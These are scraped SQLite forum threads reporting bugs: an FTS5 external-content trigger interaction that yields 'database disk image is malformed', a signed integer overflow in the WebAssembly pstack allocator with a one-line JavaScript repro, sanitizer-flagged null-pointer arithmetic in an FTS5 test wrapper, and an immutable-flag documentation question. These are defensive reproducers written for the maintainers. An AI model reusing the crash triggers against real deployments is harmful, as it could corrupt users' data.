-- issuing a nested UPDATE from within its own body. This is the only
-- ingredient that turns the well-formed sync trigger above into a
-- corruption. Removing either trigger 1 or trigger 2 makes the bug
-- disappear.
CREATE TRIGGER t_touch
AFTER UPDATE ON t
FOR EACH ROW
WHEN NEW.ts = OLD.ts
BEGIN
UPDATE t SET ts = datetime('now') WHERE id = NEW.id;
END;

INSERT INTO t(id, body, ts) VALUES(1, 'hello world', '2026-01-01 00:00:00');

-- This UPDATE does not touch `ts`, so t_touch's nested UPDATE fires.
UPDATE t SET body = 'goodbye world' WHERE id = 1;

Expected Result
The final UPDATE succeeds, t_fts is resynced to the new body text, and a subsequent SELECT ... FROM t_fts WHERE t_fts MATCH 'goodbye' returns the row.

Actual ResultRuntime error near line 41: database disk image is malformed (11)

(SQLITE_CORRUPT, extended code 267 via the C API.) The error surfaces on the final UPDATE statement itself, not on a later read.

Isolation Notes

Dropping t_touch (keeping only the FTS5 sync trigger) makes the UPDATE succeed.
Dropping t_au (keeping only t_touch) also makes the UPDATE succeed, since there is then no FTS5 index to desync — confirming the FTS5 sync trigger's own interaction with the shadow tables is where the corruption is actually detected.
t_touch's nested statement only needs to be an ordinary UPDATE on the same content table; it does not itself touch any FTS5-indexed column (body) and its WHEN clause is the only thing that makes it fire conditionally, which is not load-bearing for the bug -- an unconditional second AFTER UPDATE trigger doing the same nested UPDATE reproduces it identically.
PRAGMA recursive_triggers is OFF by default and the nested UPDATE does not re-fire t_au (confirmed: setting recursive_triggers ON or OFF explicitly does not change the outcome either way), so this does not appear to be ordinary trigger recursion.
The bug's reproducibility was, in earlier less-isolated testing, sensitive to incidental details (e.g. whether a text column was populated via a literal bound parameter vs. left to a column DEFAULT expression at INSERT time). The minimal repro above is the most reliable trigger condition found: two AFTER UPDATE triggers on an FTS5 external-content table, one of which issues a nested UPDATE on that table.

Suggested Workaround
Don't put a second AFTER UPDATE trigger with a nested write on a table that also has an external-content FTS5 sync trigger. Fold any "touch a timestamp column" logic into the same statement that changes the row (UPDATE t SET body = ?, ts = CURRENT_TIMESTAMP WHERE ...) instead of a second trigger with its own nested UPDATE.

Disclosure
This report was drafted with AI assistance (an Anthropic Claude agent) during a code review of an unrelated open-source project, where the original symptom was observed against SQLite 3.53.2 via the Rust rusqlite crate. The minimal reproduction above was constructed and independently verified by hand: run against three separate SQLite builds/bindings (system CLI, Python's bundled module, and a from-source build of the exact bundled amalgamation), and checked for memory-safety issues with AddressSanitizer + UndefinedBehaviorSanitizer and Valgrind memcheck (both clean, as noted above) before submission.

posts.author: dan
posts.body:
Thanks for posting. I think the problem in this case is that the script inserts rows into the content table "t", but does not insert them into t_fts. And there is no trigger to do so either. If you add:
INSERT INTO t_fts(rowid, body) VALUES(1, 'hello world');

after the insert on table "t", you get the expected result.

Dan.

posts.author: recregt
posts.body:
Thanks Dan, and sorry for the noise — you're right about that example. I
over-simplified when I cut it down and dropped the AFTER INSERT sync
trigger in the process, so that specific script never had the row in the
FTS index to begin with. That's on me, not SQLite.

Before reposting I went back and checked it against the actual schema this
came from, which does have a correct AFTER INSERT trigger (verified with
a sanity SELECT ... MATCH right after the INSERT, confirming the row is
indexed). The corruption still happens there, so I re-isolated it more
carefully this time — checking every reduction against both a corrupting
and a non-corrupting run before trusting it, rather than assuming.

The real trigger it needs is a second, independent AFTER UPDATE trigger
on the same table, alongside the FTS sync trigger — in my case a "bump
updated_at" trigger that does its own nested UPDATE, guarded by
WHEN NEW.updated_at = OLD.updated_at so it only fires when the caller's
UPDATE didn't already touch that column. With that second trigger
present, whether the corruption happens turns out to depend on the actual
text being written: it reproduces when the new value is a token superset
of the old one (appending or prepending a word), and does not reproduce
when a token is changed or dropped instead. That data-dependence is why my
first cut-down example (and probably any quick manual test of the
underlying schema) could easily look fine.

Minimal script, with the AFTER INSERT trigger this time:
CREATE TABLE catalog_packages (
id          TEXT PRIMARY KEY,
name        TEXT NOT NULL,
updated_at  TEXT NOT NULL
);

CREATE VIRTUAL TABLE catalog_packages_fts USING fts5(
name,
content = catalog_packages,
content_rowid = rowid
);

CREATE TRIGGER catalog_packages_ai AFTER INSERT ON catalog_packages BEGIN
INSERT INTO catalog_packages_fts(rowid, name) VALUES (new.rowid, new.name);
END;

CREATE TRIGGER catalog_packages_au AFTER UPDATE ON catalog_packages BEGIN
INSERT INTO catalog_packages_fts(catalog_packages_fts, rowid, name) VALUES ('delete', old.rowid, old.name);
INSERT INTO catalog_packages_fts(rowid, name) VALUES (new.rowid, new.name);
END;

-- not an FTS trigger -- an independent "touch updated_at" trigger.
-- dropping just this one, with everything else unchanged, makes the
-- corruption go away.
CREATE TRIGGER catalog_packages_update_timestamp
AFTER UPDATE ON catalog_packages
FOR EACH ROW
WHEN NEW.updated_at = OLD.updated_at
BEGIN
UPDATE catalog_packages
SET updated_at = datetime('now')
WHERE rowid = NEW.rowid;
END;

INSERT INTO catalog_packages (id, name, updated_at)
VALUES ('winget/Contoso.App', 'Contoso App', '2026-04-14 12:34:56');

SELECT 'sanity=' || count(*) FROM catalog_packages_fts WHERE catalog_packages_fts MATCH 'Contoso';
-- sanity=1, confirms the row is indexed

UPDATE catalog_packages SET name = 'Contoso App 2' WHERE id = 'winget/Contoso.App';
-- database disk image is malformed

'Contoso App 2' keeps both tokens of 'Contoso App' and adds one. If I
instead update name to something like 'Contoso Tool' (changes a token
instead of only adding one), or drop the catalog_packages_update_timestamp
trigger entirely and leave everything else the same, it succeeds normally.
So both the second trigger and the token-superset text change seem to be
required together.

I also reran this under ASan+UBSan and Valgrind memcheck against the
bundled 3.53.2 amalgamation compiled with matching -DSQLITE_ENABLE_*
flags — no findings in either tool, on the corrupting runs included, so
this looks like a logic bug rather than a memory-safety one.

Happy to try more variations if it'd help narrow it down further, and
apologies again for the sloppy first pass.

posts.author: dan
posts.body:
Hi,

Thanks for following up with this. It's a tricky case. Everything seems to be
working correctly, but the advice in fts5.html just doesn't work. Here's an
illustrative script which writes to a "log" table instead of updating a
contentless fts5 table:
CREATE TABLE content(id INTEGER PRIMARY KEY, f1, f2);
INSERT INTO content VALUES(1, 'value one', 1);
CREATE TABLE log(x);

CREATE TRIGGER u1 AFTER UPDATE ON content BEGIN
INSERT INTO log VALUES(format('DELETE id=%d f1=%s', old.id, old.f1));
INSERT INTO log VALUES(format('INSERT id=%d f1=%s', new.id, new.f1));
END;

CREATE TRIGGER u2 AFTER UPDATE ON content WHEN old.f2=new.f2 BEGIN
UPDATE content SET f2 = f2+1 WHERE rowid=new.rowid;
END;

UPDATE content SET f1 = 'value one two' WHERE id=1;
SELECT * FROM log;

which outputs:
╭──────────────────────────────╮
│              x               │
╞══════════════════════════════╡
│ DELETE id=1 f1=value one two │
│ INSERT id=1 f1=value one two │
│ DELETE id=1 f1=value one     │
│ INSERT id=1 f1=value one two │
╰──────────────────────────────╯

which is incorrect, as the initial value in the table was "value one", not
"value one two".

The trouble is that the top-level update causes triggers u2 and u1 to fire,
in that order. And u2 causes u1 to fire again. So the first two entries in
table "log" above are coming from the u2 -> u1 trigger, and the second two
are coming from the toplevel statement firing u1 directly. But by the time
they are executed, the content table has already been updated again..

I think we will just have to have the docs note that strange things may happen
if fts5 AFTER UPDATE triggers are combined with other AFTER UPDATE triggers
that write to the content table.

In practice, I think things would also work fine if the fts5 trigger was the
last one created.

Dan.

title: Signed integer overflow in WebAssembly pstack allocation

posts.author: Stan Bot (stanbot8)
posts.body:
I found a signed integer overflow in the WebAssembly pstack allocator.

Fossil check-in:

75d3343fa3daa0503c057bae14c83ce6a1c5b8dfa4b5a312168b26e5d877684b

In sqlite3__wasm_pstack_alloc() in ext/wasm/api/sqlite3-wasm.c, the requested size is aligned with:
n = (n + 7) & ~7;

Because n is an int, n + 7 overflows before the allocator checks whether the request fits within the remaining pstack capacity.

The issue is reachable through the WebAssembly JavaScript interface:
sqlite3.wasm.pstack.alloc(0x7fffffff);

I reproduced it with SQLite 3.54.0, Emscripten 4.0.16, and UndefinedBehaviorSanitizer.

From the repository root:
./configure --with-emsdk=/path/to/emsdk --disable-shared
make -j2 sqlite3.c
make -C ext/wasm -j2 b-esm \
emcc.flags='-O1 -fsanitize=undefined -fno-sanitize-recover=undefined'

Save the following as ext/wasm/repro.html:
<!doctype html>
<script type="module">
import sqlite3InitModule from "./jswasm/sqlite3.mjs";
const sqlite3 = await sqlite3InitModule();
sqlite3.wasm.pstack.alloc(0x7fffffff);
</script>

Serve ext/wasm and open repro.html in a browser:
python3 -m http.server --directory ext/wasm 8000

The sanitizer reports:
api/sqlite3-wasm.c:320:10: runtime error: signed integer overflow: 2147483647 + 7 cannot be represented in type 'int'

The capacity check needs to reject an oversized request before adding the alignment adjustment. A second check after alignment is still needed because rounding can make an otherwise accepted size exceed the remaining capacity.

I verified that checking the requested size against the remaining capacity before alignment, then checking the aligned size again, rejects the oversized allocation without changing the pstack pointer. A subsequent normal eight-byte allocation and restore still work correctly.

I have not demonstrated a security exploit. The confirmed issue is externally reachable undefined behavior in the WebAssembly allocation path.

posts.author: stephan
posts.body:
api/sqlite3-wasm.c:320:10: runtime error: signed integer overflow: 2147483647 + 7 cannot be represented in type 'int'

i will get this fixed soon but want to stress that this is a 100% artificial problem. One cannot allocate anywhere near that amount of memory in browser-side WASM environment and trying to does not allow one to escape the WASM sandbox's memory.

The corresponding getter contains the inverse operation:
iVal = (int)((char*)p->pApi->xGetAuxdata(p->pFts, bClear) - (char*)0);

The test exercising this is ext/fts5/test/fts5aux.test:
proc prevrowid {add cmd} {
set res [$cmd xGetAuxdataInt 0]
set r [$cmd xRowid]
$cmd xSetAuxdataInt $r
return [expr $res + $add]
}

and:
do_execsql_test 3.1 {
SELECT prevrowid(e5) || '+' || rowid FROM e5 WHERE e5 MATCH 'c'
} {0+1   1+3   3+5}

The first call to xSetAuxdataInt therefore passes 1, causing the expression:
(char*)0 + 1

which is undefined behavior in C.

Comparison with normal build

The same test using the normal test fixture completes successfully:
SQLite 2026-07-24 19:02:57 bf7c7f30031888f4e796e429ab3978879485813aaca6f641c7b33e4e09459bcc
0 errors out of 1 tests on threadripper Linux 64-bit

Thus this appears to be sanitizer-visible undefined behavior in the FTS5 Tcl
test interface rather than a functional failure in the normal build.

Related code

SQLite's private headers already contain integer/pointer conversion macros based on intptr_t:
#define SQLITE_INT_TO_PTR(X)  ((void*)(intptr_t)(X))
#define SQLITE_PTR_TO_INT(X)  ((int)(intptr_t)(X))

The FTS5 Tcl test wrapper currently uses null-pointer arithmetic instead.

A possible correction would be to use an intptr_t conversion, for example:
#include <stdint.h>

and:
rc = p->pApi->xSetAuxdata(p->pFts, (void*)(intptr_t)iVal, 0);

with the corresponding getter using:
iVal = (int)(intptr_t)p->pApi->xGetAuxdata(p->pFts, bClear);

I have not yet verified whether this is the preferred SQLite coding style for this
particular test interface, so I am reporting the sanitizer finding rather
than asserting a specific patch.

Additional observation
ext/fts5/test/fts5fault4.test also uses the same xSetAuxdataInt interface:

proc previc {cmd} {
set res [$cmd xGetAuxdataInt 0]
$cmd xSetAuxdataInt [$cmd xInstCount]
return $res
}

so the same conversion code is also exercised by the FTS5 fault-injection tests.

On https://sqlite.org/uri.html it says, of the immutable=1 flag, that "SQLite always opens immutable database files read-only".
But I find that a file with the immutable flag is still opened read-write:

$ strace -e openat ./sqlite3 'file:test.db?immutable=1' '.tables' 2>&1 | grep test
openat(AT_FDCWD, "test.db", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 3

I have to add mode=ro for it to be opened read-only:

$ strace -e openat ./sqlite3 'file:test.db?immutable=1&mode=ro' '.tables' 2>&1 | grep test
openat(AT_FDCWD, "test.db", O_RDONLY|O_NOFOLLOW|O_CLOEXEC) = 3

Which is fine to do! But have I misunderstood the documentation in some way?

This is with a freshly compiled sqlite:
